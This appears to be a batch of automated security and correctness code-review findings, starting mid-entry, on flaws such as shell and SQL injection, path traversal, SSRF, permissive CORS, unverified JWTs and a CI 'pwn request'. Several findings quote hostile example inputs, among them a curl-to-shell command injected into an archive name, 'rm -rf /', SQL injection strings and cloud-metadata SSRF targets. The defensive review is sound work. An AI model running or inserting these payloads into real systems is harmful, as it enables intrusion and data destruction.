This change would raise a TypeError in that case instead of returning default. No test in this diff exercises get_cookie with a malformed Cookie header / cookies=None, so this regression would not be caught by the existing test suite.

findings.title: Dropping strip() makes boundary parameter never match
findings.body:
`content_type.split(";")` leaves the leading space that RFC-formatted headers put after the semicolon, so for the normal header `multipart/form-data; boundary=----abc` the second element is `" boundary=----abc"`. After `field.partition("=")` that gives `k == " boundary"`, which fails the `k == "boundary"` test on line 5, so `_parse_mime_body` is never called and the multipart body (file uploads and form fields) is silently dropped — no error is raised, the request just arrives with empty arguments/files.

The `.strip()` is not redundant: it is what normalises the whitespace introduced by splitting on `;`. Restore it, e.g. `k, sep, v = field.strip().partition("=")`, or strip `k`/`v` individually (`k.strip() == "boundary"`), noting that `v` may also need trailing-whitespace handling when further parameters follow.

findings.title: Dropping strip() makes boundary parsing depend on attacker-chosen whitespace
findings.body:
`content_type` comes straight from the client's `Content-Type` request header, and `fields = content_type.split(";")` leaves the leading space that RFC 2045/7231 permits (and that virtually every real client emits) attached to each parameter. Previously `field.strip()` removed it, so `"multipart/form-data; boundary=abc"` yielded `k == "boundary"`. After this change `k == " boundary"`, the `k == "boundary"` test on line 5 fails, and `_parse_mime_body` on line 6 is never reached — the multipart body is silently discarded and `arguments`/`files` come back empty with no error.

The security consequence is that the client alone decides whether Tornado parses the body: `multipart/form-data;boundary=abc` (no space) is parsed, `multipart/form-data; boundary=abc` is not. Any upstream component that parses multipart normally — a WAF, a proxy doing content inspection, an audit/logging tier — will see fields that the application never sees, or vice versa, which is exactly the shape of a filter-bypass/desync bug. Handlers that treat a missing field as "nothing submitted" rather than an error will also take a different code path than intended.

Secondarily, the old `strip()` also normalised the parameter *value*; now `"multipart/form-data;boundary=abc "` passes `"abc "` (with trailing whitespace, or a stray CR on sloppy header folding) into `_parse_mime_body`, so the delimiter the parser searches for no longer matches the one on the wire.

Restore the strip — either `field.strip().partition("=")` as before, or strip `k` and `v` individually — and prefer parsing the header with an RFC-aware helper (e.g. `tornado.httputil.parse_body_arguments`/`_parse_header`) rather than a hand-rolled `split(";")`.

findings.title: No test guards whitespace handling in Content-Type parsing
findings.body: The change removes `field.strip()` before partitioning on '=', which affects parsing of Content-Type headers with spaces around the boundary parameter (a common real-world format like 'multipart/form-data; boundary=xyz'). Since 'k' is compared with `== "boundary"` after partition, a leading space (e.g. ' boundary') would now fail to match and silently skip multipart parsing. No test in this diff exercises this case, so a regression in whitespace handling would not be caught.

findings.title: No test exercises the malformed error message path
findings.body: The change drops the '% url' argument from the format string, so 'Failed to parse: %s' % () would raise a TypeError when this branch executes, rather than a LocationParseError with a useful message. If there is no existing test that triggers the non-digit port branch and asserts on the raised exception type/message, this regression would go unnoticed until it fails in production.

findings.title: Format placeholder left in message after removing interpolation
findings.body: The interpolation operand `% url` was removed but the `%s` placeholder was kept, so the exception message is the literal string `"Failed to parse: %s"`. Callers and logs that surface this error lose the URL that failed to parse and instead show a raw format specifier, which is confusing and makes the failure much harder to diagnose. If the intent was to shorten the message, drop the placeholder too (e.g. `raise LocationParseError("Failed to parse")`); if the URL should still be reported, restore `% url`.

findings.title: Shell command injection in create_archive via name/directory
findings.body:
`create_archive` interpolates `name` and `directory` into a shell string and executes it with `shell=True`. Any shell metacharacter in either value escapes the intended `tar` invocation — e.g. `name = "x; curl attacker.sh | sh; #"` or `directory = "/tmp; rm -rf /"` — yielding arbitrary command execution as the service user. `name` additionally allows path traversal out of `/exports` (`../../etc/cron.d/x`), letting an attacker write a gzip tarball to any path the process can write.

Fix: drop the shell entirely and pass an argument vector, matching the existing `list_exports` style on line 5:

```python
safe_name = os.path.basename(name)
target = os.path.join("/exports", safe_name + ".tar.gz")
return subprocess.run(["tar", "-czf", target, directory], check=True)
```

and validate `name` against an allowlist (e.g. `^[A-Za-z0-9_-]{1,64}$`) and resolve `directory` to confirm it stays inside an expected root.

_Also raised by the correctness agent:_ Unquoted f-string with shell=True mis-parses names/paths with spaces

findings.title: No test coverage for create_archive
findings.body: The new create_archive function builds a shell command via string interpolation and executes it with shell=True. There is no test in this diff exercising this function, so neither correct behavior (archive created with expected name/contents) nor unsafe input handling would be caught by CI if the implementation regresses or is changed.

findings.title: Return shape differs from sibling function in the same module
findings.body: `list_exports` returns `.stdout` (bytes), while `create_archive` returns the whole `CompletedProcess`. Callers reading both functions in this module will reasonably expect the same convention. Either return the created archive path (the useful value here) or `.stdout` for consistency.

findings.title: dashboardCors allows any origin with credentials enabled
findings.body:
`dashboardCors` sets `origin: "*"` together with `credentials: true`, discarding the `ALLOWED` origin allowlist used by the existing export two lines above. Any route mounted with this middleware accepts cross-origin requests from arbitrary attacker-controlled pages while permitting cookies/Authorization to be attached, so a victim visiting `evil.example` can have their browser issue authenticated requests to the API and read the responses — a classic cross-origin data-theft / CSRF-with-read primitive.

Note also that the configuration as written is self-defeating in real browsers: the `cors` package emits the literal `Access-Control-Allow-Origin: *` header, which browsers refuse to honour on credentialed requests. The likely next step is someone "fixing" it by reflecting `req.headers.origin`, which is the fully exploitable form of the same bug. Either way, replace this with an explicit allowlist containing the dashboard origin, e.g. `origin: [...ALLOWED, DASHBOARD_ORIGIN]`, and keep `credentials: true` only for those named origins.

I cannot see where `dashboardCors` is mounted — the entry point (the route that uses it) is not in this diff or in retrieved context — so the concrete set of exposed endpoints is unknown; the misconfiguration itself is visible on these lines.

findings.title: origin "*" with credentials:true is rejected by browsers
findings.body:
The PR's stated goal is to let the dashboard origin call the API *with cookies*, but this configuration cannot do that. The `cors` package emits the literal header `Access-Control-Allow-Origin: *` when `origin` is the string `"*"`, and the Fetch/CORS spec requires user agents to fail any request made with `credentials: 'include'` when the allow-origin header is the wildcard. The result is that credentialed dashboard requests will be blocked by the browser rather than allowed — the opposite of the intent — while non-credentialed requests from every origin on the internet are now permitted.

The working form is to reflect the specific dashboard origin, mirroring the existing export above which uses `origin: ALLOWED`: add the dashboard origin to `ALLOWED` (or pass an explicit origin string / allowlist function here) and keep `credentials: true`.

findings.title: New dashboardCors config has no test coverage
findings.body: The new `dashboardCors` export combines `origin: "*"` with `credentials: true`, a configuration that most CORS libraries either reject at runtime or silently mishandle (browsers refuse wildcard origin with credentialed requests). There is no test verifying the actual behavior of this exported middleware — e.g., what `Access-Control-Allow-Origin` header it produces, or whether credentialed requests are actually permitted. Nothing would fail if this configuration were broken or misconfigured (e.g., origin reflection needed instead of literal wildcard).

findings.title: Public CORS config lacks documentation of intended usage
findings.body: The `dashboardCors` export is a public API with no docstring explaining its purpose or constraints. The configuration combines `origin: "*"` with `credentials: true`, which is an unusual and potentially confusing combination that may not be what callers expect. A caller integrating this into their server setup could easily apply it incorrectly without understanding the security implications and intent. Add a comment or JSDoc explaining what this is for and why this specific configuration is correct.

findings.title: Live AcmePay secret key hardcoded in source, replacing env lookup
findings.body:
`ACMEPAY_SECRET_KEY` is a literal credential with an `acme_live_` prefix, indicating a production payments key, and it is assigned directly to `acmepay.api_key`. Committing it means anyone with repository read access (plus CI logs, forks, mirrors, and the permanent git history) can charge, refund, or read payment data through the provider.

Restore the `os.environ["ACMEPAY_SECRET_KEY"]` lookup (or your secrets manager), and treat this key as compromised: rotate it at the provider now, since removing the line in a follow-up commit does not remove it from history.

findings.title: Per-environment key configuration removed; all envs now use one live key
findings.body: `client()` previously resolved the key from `os.environ["ACMEPAY_SECRET_KEY"]`, so staging, CI and production each supplied their own credential. With the literal on line 4 there is no longer any way to point a non-production deployment at a test key — every environment that imports this module will authenticate as the live account and any charge issued from CI or staging becomes a real charge. The `acme_live_` prefix on the value confirms it is not a sandbox credential. Restore the environment lookup (optionally falling back to a sandbox default) rather than baking a single value in.

findings.title: No test exercises client() to catch the credential-source change
findings.body: client() changed from reading `os.environ["ACMEPAY_SECRET_KEY"]` to using a hardcoded module-level constant. The only test-related addition in this PR is tests/fixtures/acmepay.py, which defines a fake_client() fixture but is never shown being used by an actual test that calls the real client() and asserts acmepay.api_key equals the expected value. As it stands, nothing in this diff would fail if client() were reverted, further modified, or broken (e.g. wrong key referenced, api_key not set at all).

findings.title: fake_client() return shape does not match client()
findings.body: `client()` returns the `acmepay` module object (callers therefore reach for module attributes/methods on it), while `fake_client()` returns a plain dict `{"api_key": ...}`. Any test that substitutes this fixture for `client()` will exercise a different interface than production code, so it either fails with `TypeError`/`KeyError` or silently passes without covering the real call path. Make the fixture return a stub object exposing the same attributes the real client is used through.

findings.title: tenant_of returns a tenant id from an unverified token
findings.body:
`tenant_of` calls `jwt.decode(..., options={"verify_signature": False})`, which skips signature checking and (in PyJWT) the dependent claim validations such as `exp`/`nbf`. Any caller that uses the returned value to select a tenant, scope a query, or make an access decision is trusting a value the client can forge by editing the payload of an unsigned/expired token. This also diverges from the sibling `claims_for` on line 7, which verifies with `public_key()` and RS256 — the two functions can disagree about the same token, with `tenant_of` accepting tokens `claims_for` would reject.

Decode once with verification (reuse `claims_for(token)["tenant_id"]`). If avoiding the key-store round trip is the goal, cache the public key rather than dropping verification.

_Also raised by the security agent:_ tenant_of() reads tenant_id from a JWT with signature verification off

findings.title: Public function name does not signal unverified token access
findings.body:
The function `tenant_of(token)` performs JWT decoding without signature verification (line 11: `verify_signature: False`), but its name suggests it is a safe read operation like `claims_for()`. A caller unfamiliar with the implementation could use this in a security-sensitive context believing the token has been validated, when it has not. The name should clarify the verification status — for example, `tenant_of_unverified(token)` or `unverified_tenant_from(token)` — or the function needs a docstring explicitly documenting that the token signature is not validated and explaining when it is safe to use.

_Also raised by the correctness agent:_ Unguarded dict index raises KeyError when tenant_id is absent

findings.title: No test coverage for tenant_of() unverified-claims extraction
findings.body: tenant_of() is new behavior that extracts tenant_id from a token without verifying its signature. There is no test in this diff exercising it — e.g. confirming it returns the correct tenant_id for a well-formed token, or documenting/asserting behavior for a tampered/forged token. If this function's contract changes (or is fixed to require verification), nothing here would fail to signal it.

findings.title: Missing require_owner check lets any user edit any payment method
findings.body:
`update_payment_method` takes `pm_id` straight from the request, loads the object with `PaymentMethod.get(pm_id)` (line 12) and writes to it (lines 13-14) with no ownership check. `current_user(request)` on line 11 only authenticates — the retrieved `api/auth.py` states explicitly "Authentication only — never authorisation" and "Every object mutation must call this" about `require_owner`. The `user` variable is in fact never read after line 11, which is the tell that the check was dropped.

Any signed-in user can enumerate or guess `pm_id` values and rewrite the `billing_name` on payment methods belonging to other accounts. The read endpoint immediately above (line 6) does call `require_owner`, so the fix is to mirror it:

```python
pm = PaymentMethod.get(pm_id)
require_owner(user, pm)
pm.billing_name = body["billing_name"]
```

The existing pattern (lines 5-7) shows ownership is expected to be checked on every mutation/access, per the require_owner docstring in api/auth.py stating 'Every object mutation must call this.' Nothing in this diff would fail if a user updated another user's payment method, since no test exists for this function at all.

No test guards password-reset request rate/abuse behavior

findings.title: read_export_preview skips _confined(), allowing path traversal
findings.body:
`read_export_preview` builds its path with `os.path.join(EXPORT_ROOT, name)` instead of `_confined(name)` used by the download path two lines above. `os.path.join` does not constrain the result: a `name` of `../../etc/passwd` resolves outside `EXPORT_ROOT`, and an absolute `name` such as `/etc/shadow` causes `os.path.join` to discard `EXPORT_ROOT` entirely. Since the preview is served by name from a request, any caller-controlled name yields arbitrary file reads (truncated to `limit`, which is still enough to leak credentials or keys).

Fix: route the preview through the same helper — `path = _confined(name)` — so both entry points share one containment check, rather than duplicating the layout assumption.

_Also raised by the security agent:_ Preview path skips _confined(), allowing path traversal

findings.title: No test exercises read_export_preview's path handling
findings.body: read_export_preview builds its path with os.path.join(EXPORT_ROOT, name) directly, unlike the sibling function above which calls _confined(name). If this is a behavior regression (e.g. a missing traversal guard), nothing in this diff would fail: there is no test file included that calls read_export_preview with a crafted name like '../secret' to verify it is rejected or confined the same way the download path is.

findings.title: Public function `read_export_preview` lacks docstring and safety contract
findings.body: The new function `read_export_preview` is exported and callable by other modules, but carries no docstring explaining its behaviour, parameters, return value, or importantly, what path constraints it enforces. Line 20 uses `os.path.join()` directly rather than the `_confined()` safety wrapper visible in the adjacent `read_export()` function on line 14. A caller cannot know from name and signature alone whether `name` is validated against path traversal attacks. The docstring should document the path safety contract explicitly.

findings.title: Ownership check removed from bulk_export enables cross-tenant IDOR
findings.body:
`bulk_export` takes `report_ids` from the caller and loads each one with `Report.get(rid)`, then serialises all of them with `r.to_dict()`. The loop calling `require_owner(user, report)` has been deleted and `require_owner` is no longer imported, so nothing compares `report.tenant_id` against `user.tenant_id`. Any authenticated user can enumerate or guess report IDs belonging to other tenants and read their full contents in one request. Authentication is not authorisation here.

If the loop is genuinely a performance problem, keep the check but make it set-based rather than dropping it: fetch with a tenant-scoped query (e.g. `Report.filter(id__in=report_ids, tenant_id=user.tenant_id)`) and reject or omit ids that do not come back, so the authorisation predicate is enforced in the same query that loads the rows.

_Also raised by the correctness agent:_ bulk_export no longer enforces per-object tenant ownership

findings.title: No test guards against removal of ownership check in bulk_export
findings.body: The diff removes the per-report `require_owner` authorization check in `bulk_export` but no test file is included. If this removal is wrong (i.e., callers are not always pre-scoped to their own tenant's reports), nothing in the test suite would catch a cross-tenant data leak — a test that calls `bulk_export` with report_ids belonging to another tenant and asserts a Forbidden error would have failed before this change and would silently pass now.

findings.title: Missing report ids now surface as an AttributeError instead of a clean error

Filtering or explicitly raising on missing ids would keep the failure mode meaningful. This existed before the change in a different guise (the removed `require_owner` would have raised on `None.tenant_id`), but with the loop gone the only remaining guard is the serialisation call itself.

findings.title: SQL injection via f-string interpolation in search_customers
findings.body:
`search_customers` interpolates `term` and `status` directly into the SQL string (line 9) and then calls `execute(sql)` with no `params` (line 10), so the values are parsed by the database as SQL rather than bound as data. A search term containing a single quote closes the literal, e.g. `term = "' OR '1'='1"` returns every customer row, and `status = "x' UNION SELECT ... --"` can read arbitrary tables (or worse, depending on driver multi-statement settings).

The PR description says this is a support search endpoint, so `term`/`status` are request-supplied strings; the HTTP handler is not in this diff or in the retrieved context, so the entry point is inferred from the description rather than observed.

Fix by keeping the values as bound parameters and building the LIKE wildcards in Python, matching the style of `get_customer` on line 5:

    sql = "SELECT * FROM customers WHERE name LIKE %s AND status = %s"
    return execute(sql, (f"%{term}%", status))

findings.title: search_customers bypasses execute()'s parameterisation contract
findings.body: `billing.db.execute` documents that `params` "must carry every caller value", and the sibling `get_customer` on line 5 follows that by passing `(customer_id,)` alongside a `%s` placeholder. `search_customers` instead interpolates `term` and `status` directly into the SQL text and calls `execute(sql)` with no params, so caller-supplied values reach the cursor as SQL syntax. Rewrite as `execute("SELECT * FROM customers WHERE name LIKE %s AND status = %s", (f"%{term}%", status))` so the driver binds the values.

findings.title: No test exercises search_customers
findings.body: search_customers builds a SQL string via f-string interpolation of term and status and passes no params to execute(). There is no test in this diff verifying the query text, the parameters passed to execute, or the behavior with special characters (quotes, wildcards) in term/status. If the query were subtly wrong (e.g. wrong column, broken quoting, or a fix to use parameterized queries were reverted), nothing would fail.

findings.title: Public function lacks documented contract
findings.body: The `search_customers` function is a new public API (parallel to `get_customer`) but has no docstring. A caller cannot tell from the name alone what values `term` and `status` accept, what SQL wildcards or escaping apply, or what the return format is. The parallel existing function `get_customer` also lacks a docstring, but adding a second undocumented function in the same file raises the cost of guessing correctly.

findings.title: verify_endpoint bypasses the ALLOWED_HOSTS check the module enforces
findings.body:
The existing send path parses the host and refuses anything outside `ALLOWED_HOSTS` (lines 8-9) before issuing the request on line 10. `verify_endpoint` takes the same kind of tenant-supplied URL and issues a request with no such check, so the module's invariant "we only make outbound requests to allowed hosts" no longer holds. A tenant registering a webhook target can drive a GET at any address the service can reach, including internal/loopback and cloud metadata addresses, and the response status is returned to them as a probe oracle.

Apply the same host extraction and `ALLOWED_HOSTS` membership test before calling `requests.get`, ideally by factoring the check out of the send path into a shared validator so the two cannot drift again. Note also that `requests` follows redirects by default, so validating the initial host is not sufficient on its own — pass `allow_redirects=False` (or re-validate each hop) in both functions.

findings.title: verify_endpoint performs SSRF-able GET, skipping the ALLOWED_HOSTS check
findings.body:
The function immediately above this one parses the destination and rejects it unless the host is in `ALLOWED_HOSTS` (lines 8-9) before calling `requests.post`. `verify_endpoint` takes a `url` straight to `requests.get` with no such check. Per the PR description the URL is supplied by tenants when they register a webhook target, so an authenticated tenant can make the server issue arbitrary GETs: to cloud instance metadata (`http://169.254.169.254/...`), to `http://localhost:<port>/` internal admin endpoints, to RFC1918 addresses, or via `file://`/`gopher://` if the scheme is unconstrained. The returned status code is handed back to the caller, which turns this into an internal port/host scanner even without a response body.

Fix: route this through the same validation the send path uses — parse the URL, require `https` (or an explicit scheme allowlist), resolve the host and reject loopback/link-local/private/multicast addresses, and check `ALLOWED_HOSTS` — and pass `allow_redirects=False` so a permitted host cannot 302 the request into the internal network. Factoring the existing check out of the send function into a shared `_validate_destination(url)` avoids the two paths drifting again.

findings.title: Public function `verify_endpoint` lacks contract documentation
findings.body: The function `verify_endpoint` is exported at module level (no leading underscore) and has a non-obvious contract: it makes an HTTP GET request and returns an integer status code rather than a boolean or raising an exception. A caller expecting typical verification semantics (a boolean indicating success/failure) could easily misuse this function. Either add a docstring clarifying the behavior, or rename it to reflect that it returns the status code rather than a verification result.

findings.title: New verify_endpoint function has no test coverage
findings.body: verify_endpoint is a new public function that performs a network GET and returns a status code, but no test exercises it. Notably it does not appear to reuse the ALLOWED_HOSTS check used by the sibling function above (lines 8-9), which would be a behavior worth locking down with a test either way. As written, nothing would fail if this function were removed, broken, or changed to bypass host validation.

findings.title: Customer invoices bucket created with all public access blocks disabled
findings.body:
`aws_s3_bucket.invoices` (`acme-customer-invoices`) is paired with an `aws_s3_bucket_public_access_block` that sets all four guards to `false`: `block_public_acls`, `block_public_policy`, `ignore_public_acls`, and `restrict_public_buckets`. This switches off the account-level safety net that prevents a public ACL or a `Principal: "*"` bucket policy from taking effect on this bucket. Any subsequent ACL or policy change — by a pipeline, another Terraform module, or anyone with `s3:PutBucketPolicy`/`s3:PutBucketAcl` — would immediately make customer invoices world-readable, and object-listing enumeration of a predictable bucket name is trivial for an unauthenticated attacker.

The entry point here is not application input: it is the AWS control plane. I cannot see any bucket policy or ACL for this bucket in the diff or in retrieved context, so I cannot confirm the bucket is *already* public; what is certain is that the control that would have prevented it is explicitly off.

Recommended: set all four fields to `true` for `invoices` (the default-secure posture), and if the marketing site genuinely needs public objects, serve them from the `assets` bucket via CloudFront + OAC rather than via public access. Also note the scope mismatch — the PR describes a public *assets* bucket, but the only bucket added is an invoices bucket; that discrepancy should be explained before merge.

findings.title: Invoices bucket disables all public-access protections (copy-paste of assets config)
findings.body:
The PR describes adding a *public assets bucket for the marketing site*, but the only new resources are `aws_s3_bucket.invoices` (`acme-customer-invoices`) and an accompanying public access block with `block_public_acls`, `block_public_policy`, `ignore_public_acls` and `restrict_public_buckets` all set to `false`. That configuration is identical to the assets block directly above it (lines 7-10), which strongly suggests it was copied rather than written for this bucket.

With all four flags false, any ACL or bucket policy that grants `*` — including one added accidentally later, or by an object upload with a public-read ACL — will take effect on customer invoice data. The public access block is the backstop that makes such a mistake a no-op; disabling it removes the backstop entirely.

Unless there is a deliberate requirement for invoices to be internet-readable, this resource should either be omitted or set to all `true`. If the intent really was to add a marketing assets bucket, the new bucket appears to be the wrong resource altogether.

findings.title: Webhook HMAC compared with `==` instead of compare_digest
findings.body:
`verify_acmepay` computes the expected HMAC and then compares it to the caller-supplied `header` with `==`. Python's string equality short-circuits on the first differing byte, so comparison time leaks how many leading hex characters of the expected digest the attacker got right. An unauthenticated caller who can submit many webhook requests and measure response latency can recover the signature byte by byte and forge webhook payloads without knowing `secret`. The function immediately above (`verify_stripe`, line 7) already does the right thing. Change line 12 to `return hmac.compare_digest(expected, header)`. If `header` may be `None` or a non-string, guard for that too, since `compare_digest` raises on mismatched/non-ASCII types.

_Also raised by the correctness agent:_ verify_acmepay compares HMAC with == instead of compare_digest

findings.title: Public API contract unclear: verify_acmepay uses unsafe comparison
findings.body: The function `verify_acmepay` is a public webhook verification function placed alongside `verify_stripe`, which uses `hmac.compare_digest()` for timing-safe comparison. A caller reading `verify_stripe` would reasonably expect `verify_acmepay` to follow the same security pattern, but it instead uses direct equality (`==`), which is vulnerable to timing attacks. The absence of documentation explaining this difference means callers cannot determine whether this is intentional or a security regression. Either add a docstring explaining why unsafe comparison is acceptable here, or use `hmac.compare_digest()` consistently.

findings.title: New verify_acmepay function has no test coverage
findings.body: The new verify_acmepay function is untested. findings.title: 500 handler leaks exception text and full traceback to clients
findings.body:
`handle()` previously returned a generic `{"error": "internal error"}` body; it now returns `str(exc)` plus `traceback.format_exc()` in the HTTP 500 response. Anything that can trigger an unhandled exception — an unauthenticated request with a malformed parameter is usually enough — gets back absolute source paths, module and function names, line numbers, local framework versions, and whatever the exception message contains. Exception messages routinely carry DSNs with credentials (`OperationalError: could not connect to ... password=...`), the failing SQL with literal values, or internal hostnames from an upstream HTTP client, so this is a credential-disclosure path as well as a recon aid for probing injection and path-traversal behaviour.

Keep the client body generic and give on-call the detail through the log instead: `log.exception("request failed")` on line 8 already emits the full traceback server-side. If a correlation handle is wanted, return a generated request/error ID in the response and log it alongside the exception, e.g. `return {"error": "internal error", "error_id": eid}, 500`. If you truly need the trace inline, gate it on an explicit debug setting that is off by default in production.

Separately, `traceback.format_exc()` only reflects the currently-handled exception; if `handle()` is ever invoked outside an `except` block it will emit `"NoneType: None"` rather than the trace for `exc`.

_Also raised by the correctness agent:_ traceback.format_exc() yields 'NoneType: None' outside an except block

_Also raised by the correctness agent:_ 500 response body shape and value changed for existing callers

_Also raised by the docs agent:_ 500 response format changed without documenting new contract

findings.title: No test covers the new error response payload

findings.title: Reset passwords hashed with unsalted MD5 instead of bcrypt
findings.body:
`hash_reset_password` stores a password-derived value as a single unsalted MD5 digest. MD5 is a fast, GPU-friendly hash with no work factor and no per-user salt, so an attacker who obtains these digests (DB dump, backup, log) can recover the plaintext at billions of guesses per second and can also match identical passwords across accounts via identical digests. The same file already does this correctly on line 7 with `bcrypt.hashpw(..., bcrypt.gensalt())`.

Use the existing `hash_password` for anything derived from a user-chosen password. If this function is actually meant to hash a reset *token* rather than a password, the name is misleading and it should still use SHA-256 (with a timing-safe compare on verification), not MD5.

I do not see the caller in this diff or in any retrieved context, so I cannot name the entry point that feeds `raw`; the finding rests on the function name and on `raw` being passed to a password-hashing helper alongside `hash_password`.

findings.title: Reset hash format incompatible with existing bcrypt hashes
findings.body: `hash_password` returns a bcrypt modular-crypt string (`$2b$...`), which is self-describing and verified with `bcrypt.checkpw`. `hash_reset_password` returns a bare 32-char MD5 hex digest with no salt and no algorithm marker. If both feed the same stored-password field, the verification routine cannot tell them apart: `bcrypt.checkpw(raw, md5_hex)` raises/returns false, so a user who goes through the reset path will be unable to log in — and any code that instead compares digests would silently accept the unsalted value. Make the reset path call `hash_password` (bcrypt) so the stored format stays uniform, or, if the digest is genuinely for a different purpose, name and store it separately and document that it is never a login credential.

findings.title: New hashing/checksum functions added without any tests
findings.body: hash_reset_password and checksum are newly introduced but no test file accompanies this diff. If either implementation changed behavior (e.g., truncated hash, wrong encoding, or an unhandled exception on a missing file in checksum), nothing in the current test suite would catch it.

findings.title: pull_request_target runs forked PR code with secrets (pwn request)
findings.body:
`pull_request_target` runs in the context of the base repository: the job gets a `GITHUB_TOKEN` with write permissions and access to `secrets.*`, and it runs without the approval gate that `pull_request` applies to first-time external contributors. Combining that with `ref: ${{ github.event.pull_request.head.sha }}` means the checkout contains code the PR author fully controls, and `./scripts/measure.sh` is then executed from that checkout with `NPM_TOKEN` explicitly injected into its environment.

Any person on the internet can open a PR from a fork that rewrites `scripts/measure.sh` (or any file it sources/invokes, or a `package.json` lifecycle hook it triggers) to print `$NPM_TOKEN` and the job's `GITHUB_TOKEN` to an attacker-controlled endpoint — or to push to the base repo directly using the write-scoped token. No maintainer interaction is required beyond the workflow firing on PR open.

To get the same CI signal for forks safely, keep `on: pull_request` (the fork-run token is read-only and no secrets are exposed) and remove the `NPM_TOKEN` injection. If privileged post-processing is genuinely needed, split it: an untrusted `pull_request` job that produces an artifact, and a separate `workflow_run`/`pull_request_target` job that never checks out head code and only consumes that artifact. If `pull_request_target` must stay, it must check out the *base* ref only and never execute files from the PR.

_Also raised by the correctness agent:_ pull_request_target checks out fork code and exposes NPM_TOKEN

findings.title: Stated goal is already met by pull_request; the trigger change is unnecessary
findings.body:
The PR description says the switch is needed "so external contributors get the same CI signal", but `pull_request` already triggers on pull requests from forks — it simply runs with a read-only `GITHUB_TOKEN` and no secrets. The only behaviour this change actually adds is secret availability to fork code, which is precisely the thing that must not happen.

If the real problem was that fork PRs were queued behind the "Approve and run" gate for first-time contributors, that is a repository Actions setting, not a trigger change. If the real problem was that `measure.sh` fails without `NPM_TOKEN`, the fix is to make the script work against the public registry for fork runs rather than to hand the token to untrusted code.

findings.title: MD5 digest as cache key: collisions return another input's render
findings.body:
Replacing an exact key with a digest means two different `(template_source, context)` pairs can map to the same entry, and MD5 collisions are cheap to construct on demand. If either the template source or the context is influenced by untrusted input, an attacker can craft a second input that hits an existing entry and be served content rendered from someone else's template/context. There is no reason to accept that trade here — `hashlib.blake2b` or `sha256` costs the same and removes the practical collision path. As a secondary issue, `hashlib.md5()` raises `ValueError` on FIPS-enabled builds unless called with `usedforsecurity=False`, so this line can also hard-fail at runtime on hardened hosts.

_Also raised by the security agent:_ MD5 digest as cache key allows collision-driven cache poisoning

findings.title: json.dumps raises TypeError on contexts the old tuple key accepted
findings.body: The previous key `(template_source, tuple(sorted(context.items())))` required only that context values be hashable. The new key requires them to be JSON-serialisable, which is a strictly different and narrower contract: a context containing a `datetime`, `Decimal`, `set`, a model instance, or any object with `__str__`-style rendering will now raise `TypeError: Object of type X is not JSON serializable` from `cached_render` itself — a call that previously rendered fine. Template contexts very commonly carry such objects. Either pass `default=repr` (or a dedicated encoder) to `json.dumps`, or fall back to the original tuple key when serialisation fails.

findings.title: No test covers non-JSON-serializable context values
findings.body: The old key `tuple(sorted(context.items()))` only required values to be hashable and orderable. The new key uses `json.dumps([template_source, context], sort_keys=True)`, which will raise TypeError for context values that aren't JSON-serializable (e.g. sets, tuples nested in ways that change identity, custom objects, datetimes) even though such values may have worked previously. None of the added tests pass a context with such a value, so this behavior change — turning previously-working calls into exceptions — would go undetected.

findings.title: create_archive docstring omits exception contract
findings.body: The function now raises ValueError when the archive name fails validation, but the docstring does not document this. A caller following the docstring alone would not know to handle or avoid this exception. Add a note on what constitutes a safe name and that ValueError is raised for unsafe names.

findings.title: create_archive now raises ValueError for names callers previously used
findings.body: `SAFE_NAME` permits only `[A-Za-z0-9_-]{1,64}`, so any existing caller passing a name containing a dot, space, colon or slash — e.g. a timestamped `nightly.2024-01-01` or `db:full` — now gets a `ValueError` where it previously produced an archive. Names longer than 64 characters fail the same way. The old signature could only raise `CalledProcessError`, so callers wrapping this in `except subprocess.CalledProcessError` will see the new exception escape. Either widen the character class to include the separators actually in use (`.` at minimum, while still excluding `/`, `..` and leading `-`), or confirm from the call sites that no such names exist and document the new exception in the docstring.

findings.title: No test asserts the actual tar argv list for a valid call
findings.body: test_runs_without_a_shell only checks `spy.last_call.kwargs["shell"] is False`; it never inspects the positional args passed to subprocess.run. If the list construction regressed (e.g. dropped the `--` separator, mis-ordered name/directory, or reintroduced string interpolation that reopens injection while still passing shell=False), this test would keep passing. Add an assertion on spy.last_call.args (or equivalent) checking the full argv list for a valid name/directory pair.

findings.title: `directory` reaches tar unvalidated; source not visible in this change
findings.body:
`name` is now constrained by `SAFE_NAME.fullmatch`, but `directory` flows straight from the parameter on line 7 into the argv list on line 12 with no check. Shell injection is correctly closed off (list argv, `shell=False`) and `--` prevents it being read as a tar option, so this is not a command-injection path. What remains is scope: if a caller can influence `directory`, it can name any path readable by the process (`/etc`, `/root`, another tenant's export dir) and the contents land in a fetchable `/exports/<name>.tar.gz`, i.e. arbitrary-file disclosure via the archive rather than via the shell.

If callers only ever pass server-chosen paths, this is nothing. If any request data reaches it, resolve the path and assert it stays under an expected export root before invoking tar.

findings.title: Test depends on an unshown `spy` fixture and asserts only the shell kwarg
findings.body: `test_runs_without_a_shell` takes a `spy` fixture that is not defined anywhere in this change. If no `conftest.py` already provides it, the test errors rather than passing; if it does not actually patch `subprocess.run`, the test shells out to real `tar` and writes to `/exports`. Separately, the assertion only checks `shell is False` — it does not check that the first positional argument is a list, nor that `directory` is passed as its own argv element after `--`, which is the property the change actually exists to guarantee. Add an assertion on `spy.last_call.args[0] == ["tar", "-czf", "/exports/nightly.tar.gz", "--", "/srv/data"]` and make the fixture's origin explicit.

findings.title: Failing half-to-even test deleted with no accompanying fix in this diff
findings.body:
The PR description says the rounding was fixed and the test asserting the old behaviour was dropped, but this change set touches exactly one file and contains only a deletion — there is no change to the implementation of `round_cents` anywhere in the diff. As submitted, the effect is that a failing assertion is removed while the behaviour it caught stays as it is.

findings.title: Mock patches wrong target; real deliver() is still called
findings.body:
`notify/sender.py` does `from notify.transport import deliver`, which binds `deliver` as an attribute of the `notify.sender` module at import time. Patching `notify.transport.deliver` rebinds the attribute on the *transport* module only; `send_with_retry` keeps calling the original function object it captured. This test therefore invokes the real `deliver` three times (possible network/IO in the test suite) and its `is False` assertion only holds by accident if the real transport happens to return a falsy value — it is not verifying the retry-exhaustion path at all, and it will silently stop being meaningful the moment the real transport behaves differently.

Patch the name where it is looked up, matching the existing test on line 2: `mocker.patch("notify.sender.deliver", return_value=False)`. Consider also asserting the mock was called exactly `attempts` times so the retry count is actually covered.

_Also raised by the tests agent:_ Mock patches wrong target; retry path is not actually tested

findings.title: Test patches wrong target; contradicts documented behavior
